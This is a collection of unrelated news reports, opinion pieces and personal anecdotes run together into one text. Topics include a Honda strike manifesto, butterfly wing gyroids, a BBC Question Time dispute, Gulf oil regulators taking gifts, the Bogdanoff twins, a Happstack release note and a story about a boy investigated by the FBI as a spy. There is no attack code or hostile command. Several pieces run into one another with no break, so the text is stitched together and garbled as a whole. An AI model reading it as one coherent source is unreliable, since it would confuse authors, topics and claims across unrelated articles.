But what do those of us who create the profits get ?
If we are not satisfied we can of course resign , but Honda will continue to recruit people , and our brothers and sisters would continue to suffer here !
Even if we quit we have to fight for our brothers ’ and sisters ’ benefit !
This is another reason for us to continue to strike !
Some people even say that because we are just secondary technical school students and vocational school students , we do not deserve higher wages .
First of all I would like to ask : are you looking down on us as technical secondary school students ?
I strongly despise you !
Although we are technical secondary school students , we have created a profit of 4 billion yuan a year !
Can you do that ?
No , you can ’t !
On May 17 when the strike began , the high - level Japanese management ordered us to resume production .
We responded that we would do so and gave them a week to reply to our demands or else we would quit .
Then they secretly fired our leaders !
The general manager , in his office , mocked us as fools .
Where was their good will ?
So we went on strike again on May 21 .
The Japanese managers have resorted to taking pictures of us , to threaten us to resume production !
At this critical moment our great trade union did nothing for us !
Instead they just wanted us to go back to the production line !
Is this what a union should be doing ?
You take from our monthly wages 5 yuan for union dues but look what you had done for us !
On May 22 the Japanese manager sacked two of our leaders to threaten us to resume production .
So is this your good will ?
On May 24 you announced that you would increase our allowances from 65 yuan to 120 , an increase of just 55 yuan !
So this is your good will ?
And you continue to make video recordings to threaten us .
This is another reason why we continue to strike .
China !
It has been promoting low - cost competition and cheap labour .
Our GDP keeps growing !
However , this growth relies on exploiting our cheap labour .
We have created all this wealth but only get very low wages in return .
Our wages are still at the level of the minimum wage .
We are still struggling to get by with this .
We created this wealth .
Do n’t we deserve to get better pay ?
With such deplorable wages , just how are we going to raise the overall level of our national economy ?
This ( kind of injustice ) is just too common !
Our parents have suffered from this cheap labour market and now they are getting old .
And now , do we , the post 1980 and 1990 generation , want to follow in the footsteps of our parents ?
I believe no parent wants this .
It is because they all once walked down this road and know how hard it is .
We do not want to go this way either .
Times have changed !
So this kind of cheap labour regime must end !
Honda is a Japanese company and Japan is a capitalist country .
But China is supposed to be a socialist country !
The Japanese companies investing in China must follow the rules of China .
Implement socialism !
Do not give us capitalism !

Some butterflies get their fabulous colors from light refracted through membrane shapes that were first discovered by mathematicians and applied in space - age material science .
Using microscopes with three - dimensional nanoscale resolution , Yale University researchers found that shades of green in the wings of five butterfly species are produced by crystalline structures called gyroids .
The gyroid shape was conceived in 1970 by NASA physicist Alan Schoen in his theoretical search for ultra- light , ultra - strong materials for use in space .
The new study describing the shape in butterflies is in the June 15 * Proceedings of the National Academy of Sciences .
*
Gyroids have what 's known as an " infinitely connected triply periodic minimal surface " :
For a given set of boundaries , they have the smallest possible surface area .
The principle can be illustrated in soap film on a wireframe ( see image at right ) .
Unlike soap film , however , the planes of a gyroid 's surface never intersect .
As mathematicians showed in the decades following Schoen 's discovery , gyroids also contain no straight lines , and can never be divided into symmetrical parts .
Yet even as mathematicians speculated on the nature of gyroids , entomologists found them in nature , at least in two dimensions .
Microscopic images of butterfly wings showed that the surface of some scales , and how those scales reflected light , matched the predictions of gyroid math .
Those analyses looked only at scale surfaces .
In the new study , the researchers look at three dimensions using a microscopy technique called synchrotron small angle X - ray scattering .
Something like a combination of an electron microscope and X - ray machine , it revealed butterfly gyroids in structural high - definition .
The gyroids are made of chitin , a polymer used in insect exoskeletons , secreted by wing cells that fold naturally into gyroid shape .
After cells die and decompose , the chitin shells remain .
Light refracts through them , with subtle variations in gyroid shape and proportion producing different hues .
While the gyroids studied by the researchers were only responsible for green wavelengths , the basic principles – chitin shells in mathematically complex shapes – are likely used by butterflies to produce other colors , said study co-author Richard Prum , a Yale University biologist .
" By varying the kinds of proteins included in the membranes , butterflies may be able to develop strikingly different structures , " he said .
Material scientists now use synthetic gyroids to make photonic devices , such as solar cells and communication systems , that manipulate the flow of light .
" Nature and the evolution of structures that create colors can be an excellent guide to how we might assemble and manufacture photonic materials , " said Prum .
" Organisms have already been there . "

Brandon Keim's Twitter stream and reportorial outtakes ; Wired Science on Twitter .
Brandon is currently working on a book about ecological tipping points .
Jenna Bissell , an 11 - year - old fifth grader at Martin Luther King Jr. Elementary School in Rio Rancho , New Mexico , says she tripped outside on the school playground , cut open her face in a fall that left her bloody and with two loosened teeth , and was denied even a visit to the school nurse by her teacher — because , she says , she has two gay moms .
At first , even we thought this was a stretch : A grade school teacher would be that vindictive to a tween girl because she happens to have lesbian mothers ?
And then came this :
Shannon Peterson , one of Bissell ’s mothers , said she called the school after Bissell came home injured on Feb. 26 .
She said she talked to Bissell ’s teacher , asking why she had n’t been notified and why the girl went without treatment .
Peterson said she asked , “ Is this because she has two moms ? ” and that the teacher replied with a raised voice that yes , this was the reason and that Peterson should take her children to another school .
District spokeswoman Kim Vesely said any teacher who discriminated against a student would be disciplined .
Bissell ’s former teacher is still teaching and Vesely would not say whether she has been disciplined , citing personnel privacy .
Vesely also said “ there are differing versions of what occurred , ” but declined to give the district ’s version .
Peterson said there was a pattern of tension between Bissell and her teacher , including over an assignment in which students were asked to write a book about themselves .
On one page , they were asked to write about something they did over the summer , and Bissell said she wrote about her parents ’ wedding in Iowa , where gay marriage is legal .
“ She threw out the whole page about where my moms got married and how beautiful it was , ” Bissell said , referring to the teacher .
“ She said , ‘ This is gross , this is horrible , you need to write about something else . ' ”
As it stands , the Bissels say they are planning a civil rights lawsuit against the school district Rio Rancho Public Schools .
At the very least , they should be suing for neglect ; no teacher who witnesses a student ’s bloody injury , and fails to immediately arrange medical attention , has a place in the classroom .

What caused the worst mass extinction in Earth 's history 251 million years ago ?
An asteroid or comet colliding with Earth ?
A greenhouse effect ?
Volcanic eruptions in Siberia ?
Or an entirely different culprit ?
A Northwestern University chemical engineer believes the culprit may be an enormous explosion of methane ( natural gas ) erupting from the ocean depths .
In an article published in the September issue of Geology , Gregory Ryskin , associate professor of chemical engineering , suggests that huge combustible clouds produced by methane gas trapped in stagnant bodies of water and suddenly released could have killed off the majority of marine life and land animals and plants at the end of the Permian era -- long before dinosaurs lived and died .
The mechanism also might explain other extinctions and climate perturbations ( ice ages ) and even the Biblical flood , as well as be the cause of future catastrophes .
Ryskin calculated that some 10,000 gigatons of dissolved methane could have accumulated in water near the ocean floor under high pressure .
If released quickly , perhaps triggered by an earthquake , the resulting cloud of methane would have an explosive force about 10,000 times greater than the world 's entire stockpile of nuclear weapons .
The huge conflagrations plus flooding and overturned oceans would cause the extinctions .
( Approximately 95 percent of marine species and 70 percent of land species were lost . )
" That amount of energy is absolutely staggering , " said Ryskin .
" As soon as one accepts this mechanism , it becomes clear that if it happened once it could happen again .
I have little doubt there will be another methane - driven eruption -- though not on the same scale as 251 million years ago -- unless humans intervene . "

In yet another nod to the protection of fledgling self - esteem , an Ottawa children ’s soccer league has introduced a rule that says any team that wins a game by more than five points will lose by default .
The Gloucester Dragons Recreational Soccer league ’s newly implemented edict is intended to dissuade a runaway game in favour of sportsmanship .
The rule replaces its five - point mercy regulation , whereby any points scored beyond a five - point differential would not be registered .

Kevin Cappon said he first heard about the rule on May 20 — right after he had scored his team ’s last allowable goal .
His team then tossed the ball around for fear of losing the game .
He said if anything , the league ’s new rule will coddle sore losers .
“ They should be saying anything is possible .
If we can get five goals really fast , well , so can the other team , ” said Kevin , 17 , who has played in the league for five years .
“ People grow in adversity , they do n’t really get worse … .

Downing Street refused to field a Cabinet minister on Question Time because the panel featured Alastair Campbell , the BBC has said .
The show 's executive editor Gavin Allen said No 10 had offered to put up a minister but only if Mr Campbell was replaced by a shadow cabinet member .
Mr Allen said he refused the request as a point of " fundamental principle " .
No 10 objected to the fact that former Labour communications chief Mr Campbell was not a shadow minister .
The row meant that , unusually , there was no representative of the government or an MP from the opposition on the programme .
Backbench Conservative MP
John Redwood , who this week demonstrated his independence from the government by calling for its policy on capital gains tax to be scrapped , was representing the Conservatives .
He began the programme by saying he was " very happy to defend the coalition government , to represent it , " in the absence of a minister .
The other guests were former Lib Dem MP Susan Kramer , and journalists Piers Morgan and Max Hastings .
' Extraordinary '
Introducing the programme , host David Dimbleby said he would have " expected " to have had a government minister on the panel in the week that it unveiled its legislative agenda for the year ahead in the Queen 's Speech .
It is for Question Time , not political parties , to make judgements about impartiality and to determine who is invited to appear in the interests of the audience

Send us your comments
He explained that No 10 had made it clear that a cabinet minister was " available " to appear but only if Mr Campbell was replaced by a member of the shadow cabinet .
He said it was up to " us on Question Time to decide who should be on the programme not Downing Street " .
Mr Campbell said it was " extraordinary " there was no member of the government on the show in the week of the Queen 's Speech " regardless of who else is on the panel " .
It is believed David Laws , the chief secretary to the Treasury , had been scheduled to appear on the show .
At the end of the show Mr Campbell held up a picture of Mr Laws and suggested that he had been due to appear .
Question
Time executive editor Mr Allen said it was the " first time " in his three years in the job that No 10 had made such a demand .
' Influential '
Explaining why it had been " obviously refused " , he said : " It is a fundamental principle of our independence that politicians cannot dictate who sits on the panel .
" It is for Question Time , not political parties , to make judgements about impartiality and to determine who is invited to appear in the interests of the audience .
" Parties are free to accept or reject those invitations but they do not have a right of veto over other panellists .
Licence fee payers rightly insist that the BBC must be free from political interference . "
Mr Allen said Mr Campbell was one of the most " senior and influential " figures in the Labour movement .
He added that when in government , Labour ministers had regularly appeared on Question Time when the opposition was represented either by a backbench MP or by an unelected panellist .
" It is not an argument or an objection that bears scrutiny , " he added .
Explaining the government 's decision , a Downing Street spokesman said : " In the week of the Queen 's Speech the BBC booked Alastair Campbell in the place of an opposition front bencher to appear on Question Time - which we questioned .
" Before a final decision was made on who might appear on behalf of the government the BBC directly booked John Redwood MP . " ' Cocky '
Writing about the row on his blog after the programme , Mr Campbell said he had " only learned as the programme started the reason why there was no minister " .
And he mounted a strongly worded attack on what he called the Lib Dem - Tory coalition government 's " idiotic decision to try to get me kicked off the panel by refusing to field a minister if I was ' the Labour voice ' " .
He added : " It suggested that since becoming the government despite their failure to secure a majority , the Tories have gone all cocky and decided they can start to dictate the terms on which impartial broadcasters go about their business .
" I may be a bit of a control freak but the idea of saying you can only have x if y is axed was way beyond my understanding of the rules of the game . "
Mr Campbell was a key adviser to Tony Blair in opposition and was No 10 director of communications and strategy between 1997 and 2003 - when he stepped down from the role .
He recently returned to the limelight advising Labour on its general election strategy and was among those coaching Gordon Brown ahead of the leadership debates .
He was one of a close circle of advisers in Downing Street in the final hours of Mr Brown 's premiership as the party tried and failed to negotiate a coalition deal with the Liberal Democrats .

The situation in the Gulf keeps getting worse , and so far , there 's no end in sight .
Anderson Cooper reports live tonight from the region as BP makes another attempt to stop the leak .
Watch " AC360° " tonight at 10 ET on CNN for the latest on stopping the leak .
Washington ( CNN ) --
Federal inspectors overseeing oil drilling in the Gulf of Mexico accepted meals and tickets to sporting events from companies they monitored , the Interior Department 's inspector general concluded in a report released Wednesday .
In one case , an inspector in the Minerals Management Service office in Lake Charles , Louisiana , conducted inspections of four offshore platforms while negotiating a job with the company , the report states .
Others let oil and gas company workers fill out their inspection forms in pencil , with the inspectors writing over those entries in ink before turning them in .
Some in the same office accepted tickets to the 2005 Chick - fil - A Peach Bowl , a college football bowl game in Atlanta , Georgia .
One inspector told an office clerk , " Everyone has gotten some sort of gift before at some point " from companies they regulated , according to the report .
Investigators from the inspector general 's office , the Interior Department 's independent watchdog agency , took their findings to federal prosecutors in Louisiana , the report states .
But the U.S. attorney 's office in Lake Charles declined to bring charges , according to the report .
Full coverage of the Gulf oil spill
" Through numerous interviews , we found a culture where the acceptance of gifts from oil and gas companies were widespread throughout that office , " the report states .
However , that culture waned after a supervisor in the agency 's New Orleans , Louisiana , regional office was fired for taking a gift from a regulated company in 2007 , the report found .
The period covered in the report is well before the April explosion that sank the oil rig Deepwater Horizon , resulting in a massive oil spill that well owner BP and federal authorities are trying to cap a month later .
But Mary Kendall , the Interior Department 's acting inspector general , said she pushed for the report 's early release in the wake of the disaster .
" Of greatest concern to me is the environment in which these inspectors operate -- particularly the ease with which they move between industry and government , " Kendall wrote in a letter to Interior Secretary Ken Salazar .
Many of the inspectors joined MMS from the industry and had relationships with people in the business that originated " well before they took their jobs with industry or government . "
Sen . Ron Wyden , D - Oregon , said the report showed the agency 's safety enforcement procedures need an extensive overhaul .
" They 're supposed to be the cops on the beat , and instead they 're out tailgating at sports events with people they 're supposed to be policing , " said Wyden , who leads a Senate Environment subcommittee on public lands .
" That 's just not acceptable . "
The Lake Charles investigation was launched shortly after another scandal emerged from within the MMS .
A September 2008 inspector general 's report found regulators in the agency 's Colorado office received improper gifts from energy industry representatives and engaged in illegal drug use and inappropriate sexual relations with them .
Salazar , who has ordered a widespread shake - up of the agency since the Deepwater Horizon disaster in the Gulf of Mexico , called Tuesday 's report " yet another reason to clean house . "
" This deeply disturbing report is further evidence of the cozy relationship between some elements of MMS and the oil and gas industry , " Salazar said in a statement on the report .
He pledged to follow through with the inspector general 's recommendations , " including taking any and all appropriate personnel actions including termination , discipline and referrals of any wrongdoing for criminal prosecution . "
While the report predates the Deepwater Horizon spill , Salazar said he has asked Kendall to investigate whether inspectors failed to enforce standards aboard the rig .
Its sinking left 11 men lost at sea and oil spilling into the Gulf .
Kendall is scheduled to appear before the House Natural Resources Committee on Wednesday .
Wyden said Salazar " is heading in the right direction " by reorganizing the agency , but he said MMS needs a bigger shakeup .
" Secretary Salazar has moved , in my view , as it relates to royalty payments and financial irregularities , " he said .
" Now he has got to come down with hobnail boots on some of these ethical violations , and drain the safety swamp . "
MMS collected nearly $ 10 billion in royalties from the energy and mining industries in 2009 .
Salazar announced last week that he was splitting up the agency to separate its energy development , enforcement and revenue collection divisions , saying they have conflicting missions .
The associate director for the agency 's Offshore Minerals Management Program is leaving at the end of May , a month earlier than planned , in the wake of the Gulf spill .
That official , Chris Oynes , launched the investigation that resulted in former New Orleans , Louisiana , supervisor Donald Howard 's firing in 2007 .
Howard later pleaded guilty after being accused of failing to report gifts from an offshore drilling contractor valued at more than $ 6,600 , according to the report .
Danielle Brian , executive director of the nonprofit Project on Government Oversight , said earlier this month that the agency has been lax about collecting royalties from an industry it sees as " a partner , a client . "
She pointed out that Randall Luthi , its previous director , left at the end of the Bush administration to become president of the National Ocean Industries Association , the trade association that represents offshore drillers .
" That really gives you a picture of the people who have been running the shop here , " Brian said .

Israel Harel unsheathed the doomsday weapon that the right wing reserves for use when it feels threatened , in his article " Zionists are not tattletales " on this page on May 20 .
When Israeli patriots stand up and seek to end the occupation , with or without an agreement , and to establish an exemplary society here , that is when the right attacks .
Their weapon used to be din rodef - the Talmudic " law of the pursuer , " which permits the extrajudicial killing of someone who endangers a life .
But that ended with a pistol shot in a city square , when a Jewish terrorist shot prime minister Yitzhak Rabin in the back .
So now it 's din moser , which permits killing a Jew who intends to turn another Jew in to the gentile authorities .
Thus we witness the right calling the left " shtinkerim , " i.e. " informers . "
The uproar broke out 10 days ago , when the National Left , Peace Now , the Ofek student association and other leftist Zionist groups held a rally .
Instead of demonstrating in our own little area , Tel Aviv , we decided to gather in Zion Square , in downtown Jerusalem .
We came wearing white shirts and waving Israeli flags and placards saying " Zionists , not settlers , " and we sang " Hatikva . "
And we paid for everything from our own Zionist sources , without any help from foreign governments .
This infuriated Harel and his cohorts .
The national flag and anthem have been the exclusive property of the right for years .
That is why they won the elections .
But the right is not the " national camp " ; it 's the binational camp .
The national camp is the left , which wants to get out of the territories .
For though the left fears Qassam rockets , it is terrified by the fact that since 2008 , there has been a Jewish minority between the Jordan River and the Mediterranean Sea - and by the fact that if we do not leave the territories , Zionism will drown in a binational ocean and Ahmed Tibi will be prime minister .
Harel claims that Ofra is the equivalent of the prestate " tower and stockade " settlements , that today 's settlements in the territories are a continuation of the pioneering enterprise of that time .
But when David Ben-Gurion and the Jews in Palestine encouraged settlement under the nose of the British , they were building Jewish sovereignty and creating a Jewish majority in places that the world had designated for a Jewish state .
When Harel and his friends establish settlements , they are undermining the Jewish state 's sovereignty and its internationally recognized borders , and aiding the Palestinians in perpetuating an Arab majority .
And they are thereby fostering the declaration of a binational state .
Harel accuses us of " hatred . "
The founding manifesto of the National Left , he charges , is phrased in the language of excoriation .
But Harel himself headed the Yesha Council of settlements back in the 1980s - when , in a politely worded resolution , it demanded that the territories be annexed , and that " the legal status of Jews who reside permanently in in Judea and Samaria [ the West Bank ] and Gaza be set as [ making ] them subject to Israeli law , courts and administration . "
In less - laundered language , like that of the above - mentioned manifesto , Harel and his council were demanding that we become an apartheid state .
We refused , because that is n't Zionism .
Since that unfortunate resolution , that stain on the people of Zion , Israeli law has still not been applied to those Jews .
But Harel and company still seek to impose a settler law code on the Arabs .
For example , when a soldier removes a caravan from an illegal outpost , there is a " price tag " : A mosque will be torched , or a Palestinian wheat field set alight .
Harel , who tries to depict himself as a settler with a Jewish heart , does n't hear of such things , or see them or smell them .
But when something is said about the settlers , he is quick to react : " Shtinkerim !
Zionists are not tattletales ! "
And other similar sentiments , all in refined Hebrew .
We prefer to reply in our Rabinesque language : Zionists are not settlers .
Zionists are not racists .
Let the Zionists return to their own borders .

We 've already delved into the sadness that is those newish luxury condo buildings now sitting empty because they could n't quite avoid the market bust .
And apparently it's hard to concentrate on paying the bills when you 're an unhappy , lonely ghost tower .
According to a report being released this afternoon by Right to the City - NYC , a coalition of community groups , there are 138 new condo buildings that owe the city a total of $ 3.8 million in back taxes .
All together , these buildings include 4,092 empty housing units and have n't paid property , water , or sewer taxes for more than a year .
The Right to the City folks want the city to take the buildings back through tax foreclosure or eminent domain and turn them into affordable housing .
How would this shake out on a ' hood - by - ' hood basis ?
The report looked at neighborhoods with significant low - income populations , and the Lower East Side has the largest number of delinquent buildings , with 1,187 empty units owing $ 1,978,304 in back taxes .
In second place is DoBro , with 829 empty units and $ 1,015,677 owed in taxes .
It 's not the first time the empty condos - to - affordable housing suggestion 's been floated , but will the tax data give it any more momentum ?

TAIPEI ( Reuters ) - A man was detained in Taiwan after snatching the wig of a member of parliament who had complained against the former president Chen Shui- bian ’s release from jail , officials said on Tuesday .
Chiu Yi , a ruling Nationalist Party law - maker who has become a household name for his media - friendly offensives against the political opposition , lost his wig on Monday outside the Control Yuan , a government watchdog for state worker conduct .
Chiu had complained to the Control Yuan about the judge who let Chen out of jail on Saturday , pending trial , a Yuan publicist said .
Chen was indicted a day earlier for graft , forgery and money laundering .
A Chen supporter grabbed Chiu ’s wig outside the building , baring a mostly bald head , the publicist and local media said .
“ It feels like someone pulled my pants down in public , ” Chiu was quoted telling reporters later .
Police at the Control Yuan arrested the wig snatcher but later released him on T$ 15,000 ( $ 452 ) bail .
“ With that kind of bail , it means the crime is n’t too severe , ” the Control Yuan publicist said .
“ But it ’s unclear what the name of the crime should be called . ”

The company that oversees web addresses is expected to give the go - ahead today for the creation of a .xxx suffix for websites with pornographic content , company officials indicated .
The Internet Corporation for Assigned Names and Numbers ( ICANN ) , which oversees the internet on behalf of the US government , has in the past resisted creating a .xxx generic domain name system akin to those for .com and .net .
It has in recent years repeatedly rejected a request by US company ICM Registry to sign off on the .xxx domain .
But members of ICANN 's board have argued that in order to maintain neutrality in dealing with domain name assignations , it should create .xxx and allow websites with sexually explicit content to start using the suffix on a voluntary basis .
I knew the health care debate was going on yesterday , and I decided to drop in for a bit , given that it ’s historical and all .
Because I have a press pass , I walked straight past the line of people waiting to get into the citizen section of the chamber and went into the press section , which overlooks the Congress .
So I was about 10 feet away from the debate .
No photos , videos , or recording for this entry , I ’m afraid — none were allowed in the room .
The House Press Gallery is next to the room where health care was being debated .
Like , right next to it .
Doors opened from one room to another , and members of the press repeatedly walked in and out without ceremony .
I did so every 15 minutes to check my cell phone ( no cell phone in the House chamber , but overuse of them in the press gallery . )
Outside the window of the press room , we could hear tea party protesters shouting “ Kill the bill ! ”
The funny thing was , no one in Congress could hear them .
And they were out there ‘ till 11 pm or so .
A Congressman from Tennessee who was also a doctor said this : “ I have never operated on a Republican or Democratic cancer in my life . ”
The debate was a little boring for a while , since members of Congress kept making generic speeches as a front for all the negotiating and dealing that was going on outside the chamber , or , in some cases , inside the chamber via cell phone .
That ’s right .
The members of Congress were texting each other .
A lot .
Erich and I took a tally , and apparently around 15 to 20 members of Congress were likely to be texting at any given moment , out of the 100 or so members likely to be in the the room .
To pass the time , we also played hangman .
Do n’t tell anyone .
It really got interesting near the end , when the right and the left decided to devote all their energy to messing with each other .
Ohio Congressman ( R ) : Look at this bill .
Just look at it .
It ’s so long .
Do you really think anyone can keep their existing coverage if they like it if this bill passes ?
Entire left : Yes !
And later …
Republican Congressman : Can we pass such a bill ?
Entire right : No !
No we can ’t !
No we can ’t !
No we – ( realize what they are chanting and look around bashfully )
Entire left :
Yes we can !
Yes we can !
Entire right : RAWR !
( The right repeatedly made this booing / grumbling sound .
Think overenthusiastic , privileged zombies . )
Then came the vote .
Or actually , then the Democrats motioned for a vote .
A Republican motioned for a roll - call vote , which , in layman ’s terms , means taking about half an hour to ask each individual member of Congress how they vote on the vote to choose whether or not to vote .
Speaker : No .
The speaker was a Democrat .
Voting was pretty intense .
Everyone thought Loretta Sanchez had bailed on the Congress , but she showed up to vote literally in the last second .
Literally .
The timer said zero when she cast her vote .
The press could n’t believe it .
The bill needed 216 votes in favor to pass .
When the electronic board that is projected onto the Congress walls ( really ) turned from 215 to 216 , the whole left side started cheering , chanting “ Yes we can !
Yes we can ! ” I had been covering the immigration march earlier that day , where the constant , ongoing chant was “ Sí ses puede !
Sí se puede ! ”
I ’m starting to think it ’s a bit overused .
In the end , the bill passed by three votes .
“ A landslide ! ” said an excited , and , I suspect , left - wing journalist next to me .
Altogether , pretty historic .

Former French TV heart - throbs look unrecognisable on the red carpet after too much plastic surgery
Thirty years ago they were the heart - throbs of French television with their own primetime series on science fiction .
Now Igor and Grichka Bogdanoff look more like the alien life forms they used to report on .
The twin brothers have had so much plastic surgery they are barely recognisable .
Posing for pictures as the 150th anniversary party for luxury jeweller Chopard , the pair - now aged 60 - looked freakier than ever .
Cosm ( et ) ic : Igor and Grichka Bogdanoff were barely recognisable at the Chopard 150th anniversary party
Heartthrobs :
The twin brothers found fame with their science fiction series Temps X in the 1980s , before they became obsessed with cosmetic surgery
They are both understood to have a number of chin and cheek implants , as well as botox and fillers .
Their stretched faces echo the look of socialite Jocelyn Wildenstein , dubbed the ' bride of Wildenstein ' .
The 63 - year - old has earned the nickname her obsessive approach to surgery which has left her with incredibly strange features .
Obsessed : The Bogdanoff twins echo the case of Jocelyn Wildenstein , who has had at least seven facelifts
The ex-wife of late billionaire Alec Wildenstein has undergone at least seven face lifts and drastic eye reconstruction surgery and received collagen injections to her lips , cheeks and chin .
During her marriage to Alec , the socialite began to fear her husband was losing interest in her and , inspired by his love for cats , began altering her face to make her appear more feline .
The Bogdanoff brothers were hugely popular on French television during the 1980s .
Their boyish good looks helped them secure a number of series on science and science fiction including the hugely popular Temps X .
But in the 1990s they had their first round of plastic surgery .
They were later embroiled in controversy over problems with work they published in physics journals , which were criticised by the scientific community .
On Tuesday night the pair spent the night partying at Chopard 's 150th private party alongside stars such as Naomi Campbell , Eva Herzigova , Marion Cotillard , Kate Beckinsale and Myleene Klass .
Sir Phillip Green was also among guests at the event , during which Lionel Richie performed a special set .
The big name stars enjoyed Richie 's show from a exclusive balcony overlooking the stage at the trendy VIP Rooms on the famous Croisette .
Richie appeared on stage just after midnight to cheers from the crowd - made up of industry leaders from film , fashion and business .
Introduced by Miss Klass as a ' hero ' , the veteran singer belted out many of his solo classics as well anthems by The Commodores such as Easy Like Sunday Morning , Dancing on the Ceiling , and Hello .
All - star : Celebrities including Naomi Campbell and Eva Herzigova were at the party last night
The 60 - year - old star , who has sold more than 100 million records worldwide across a career spanning four decades , was in high spirits as he entertained the upmarket crowd .
He shouted out to the audience : ' This is going to be so good .
Everyone knows the lyrics .
I want you all to sing along .
I love it when everyone is out of control . '
Miss Campbell could be seen dancing on the balcony with her Russian oligarch boyfriend Vladimir Doronin .
The supermodel will celebrate her 40th birthday with a party in Cannes later this week .
The couple danced next to Sir Phillip who was accompanied by his 19 - year - old daughter Chloe and her friends .
Socialite Paris Hilton was also at the party - arriving halfway through Richie 's set with an entourage of six .
Her arch rival Lindsay Lohan arrived just a few minutes earlier but it is understood the pair - who have been at loggerheads for the past five years - stayed at opposite sides of the venue .
[ Haskell - cafe ] ANNOUNCE : happstack 0.5.0
( Note : Reply - to is set to haskell - cafe at haskell.org ) Hello , I am very pleased to announce Happstack 0.5.0 .
It should install cleanly from hackage via : cabal install happstack
If it does not , please report errors to the happstack mailing list :
http://groups.google.com/group/HAppS
( You will , unfortunately , need to be subscribed due to SPAM issues ) .
Here are the official release notes : Release Notes :
This release should fix many ( hopefully all ) known cabal install related issues .
It also includes many other improvements detailed below .
Known issues : * dropped support for GHC 6.8 . GHC 6.10 and 6.12 currently supported .
* happstack - data compiled with - O0 due to bug in cabal http://thread.gmane.org/gmane.comp.lang.haskell.cafe/69215
You may be able to change that to - O2 if you first do : cabal install -- reinstall syb- with - class -- disable - documentation
But we need a solution that works automatically when people run , cabal install happstack .
Changes since 0.4.1 : * many IxSet improvements by Gracjan Polak - hide IxSet constructor .
use ixSet instead .
- improved efficiency of gteTLE , getGTE , and getRange - get rid of Dynamic , just use Data .

WELLINGTON ( Reuters ) - Stressed - out city executives looking to get away from it all have the chance to buy their own rural village in New Zealand , complete with a pub and population of 40 .
Otira , a hamlet on the rainy west coast of New Zealand ’s South Island , is on the market for $ NZ1 million ( $ 715,000 ) .
Current owners Bill and Christine Hennah bought the rundown village in 1998 after passing through and “ feeling sorry for it , ” Christchurch - based newspaper The Press reported on Friday .
They paid $ NZ80,000 ( $ 56,000 ) for the hotel or pub , school , railway station , town hall and 18 houses making up the village near the Arthur ’s Pass National Park that dates back to 1923 .
The village developed when the Otira railway tunnel was opened , and during its heyday was home to about 600 workers and their families .
But the couple , now aged in their 60s , say they no longer have the energy to run the hotel .
They are asking $ NZ350,000 for the hotel or $ NZ1 million for the whole lot .
“ We need someone to build it up again .
There is a lot of potential and opportunity , ” Christine Hennah told The Press .
What Not To Write On Your Security Clearance Form
[ REDACTED ]

From : Les Earnest < LES ...@S... >

e -t-a-o-n-r - i Spy and the FBI
A friend named Bob and I read the book ``Secret and Urgent , '' by Fletcher Pratt [ Blue Ribbon Books ; Garden City , NY ; 1942 ] which was an early popular account of codes and ciphers .
Pratt showed how to use letter frequencies to break ciphers and reported that the most frequently occurring letters in typical English text are e-t - a - o - n - r - i , in that order .
( The letter frequency order of the story you are now reading is e-t - a - i- o - n-r .
The higher frequency of ``i ' ' probably reflects the fact that _I_ use the first person singular a lot . )
Pratt 's book also treated more advanced cryptographic schemes .
Bob and I decided that we needed to have a secure way to communicate with each other , so we put together a rather elaborate jargon code based on the principles described in the book .
I do n't remember exactly why we thought we needed it -- we spent much of our time outside of school together , so there was ample time to talk privately .
Still , you never could tell when you might need to send a secret message !
We made two copies of the code key ( a description of how to encrypt and decrypt our messages ) in the form of a single typewritten sheet .
We each took a copy and carried it on our persons at all times when we were wearing clothes .
I actually did n't wear clothes much .
I spent nearly all my time outside school wearing just a baggy pair of maroon swimming trunks .
That was n't considered too weird in San Diego .
I had recently been given glasses to wear but generally kept them in a hard case in the pocket of the trousers that I wore to school .
I figured that this was a good place to hide my copy of the code key , so I carefully folded it to one - eighth of its original size and stuck it at the bottom of the case , under my glasses .
Every chance I got , I went body surfing at Old Mission Beach .
I usually went by streetcar and , since I had to transfer Downtown , I wore clothes .
Unfortunately , while I was riding the trolley home from the beach one Saturday , the case carrying my glasses slipped out of my pocket unnoticed .
I reported the loss to my mother that night .
She chastised me and later called the streetcar company .
They said that the glasses had n't been turned in .
After a few weeks of waiting in vain for the glasses to turn up , we began to lose hope .
My mother did n't rush getting replacement glasses in view of the fact that I had n't worn them much and they cost about $ 8 , a large sum at that time .
( To me , $ 8 represented 40 round trips to the beach by streetcar , or 80 admission fees to the movies . )
Unknown to us , the case had been found by a patriotic citizen who opened it , discovered the code key , recognized that it must belong to a Japanese spy and turned it over to the FBI
This was in 1943 , just after citizens of Japanese descent had been forced off their property and taken away to concentration camps .
I remember hearing that a local grocer was secretly a Colonel in the Japanese Army and had hidden his uniform in the back of his store .
A lot of people actually believed these things .
About six weeks later , when I happened to be off on another escapade , my mother was visited by a man who identified himself as an investigator from the FBI ( She was a school administrator , but happened to be at home working on her Ph.D. dissertation . )
She noticed that there were two more men waiting in a car outside .
The agent asked a number of questions about me , including my occupation .
He reportedly was quite disappointed when he learned that I was only 12 years old .
He eventually revealed why I was being investigated , showed my mother the glasses and the code key and asked her if she knew where it came from .
She did n't , of course .
She asked if we could get the glasses back and he agreed .
My mother told the investigator how glad she was to get them back , considering that they cost $ 8 .
He did a slow burn , then said ``Lady , this case has cost the government thousands of dollars .
It has been the top priority in our office for the last six weeks .
We traced the glasses to your son from the prescription by examining the files of nearly every optometrist in San Diego . ''
It apparently did n't occur to them that if I were a real Japanese spy , I might have brought the glasses with me from headquarters .
The FBI agent gave back the glasses but kept the code key ``for our records . ''
They apparently were not fully convinced that they were dealing just with kids .
Since our communication scheme had been compromised , Bob and I devised a new key .
I started carrying it in my wallet , which I thought was more secure .
I do n't remember ever exchanging any cryptographic messages .
I was always ready , though .
A few years later when I was in college , I got a summer job at the Naval Electronics Lab , which required a security clearance .
One of the questions on the application form was ``Have you ever been investigated by the FBI ? ''
Naturally , I checked ``Yes . ''
The next question was , ``If so , describe the circumstances . ''
There was very little space on the form , so I answered simply and honestly , ``I was suspected of being a Japanese spy . ''
When I handed the form in to the security officer , he scanned it quickly , looked me over slowly , then said , ``Explain this ''-- pointing at the FBI question .
I described what had happened .
He got very agitated , picked up my form , tore it in pieces , and threw it in the waste basket .
He then got out a blank form and handed it to me , saying ``Here , fill it out again and do n't mention that .
If you do , I 'll make sure that you never get a security clearance . ''
I did as he directed and was shortly granted the clearance .
I never again disclosed that incident on security clearance forms .
On another occasion much later , I learned by chance that putting certain provocative information on a security clearance form can greatly speed up the clearance process .
But that is another story .

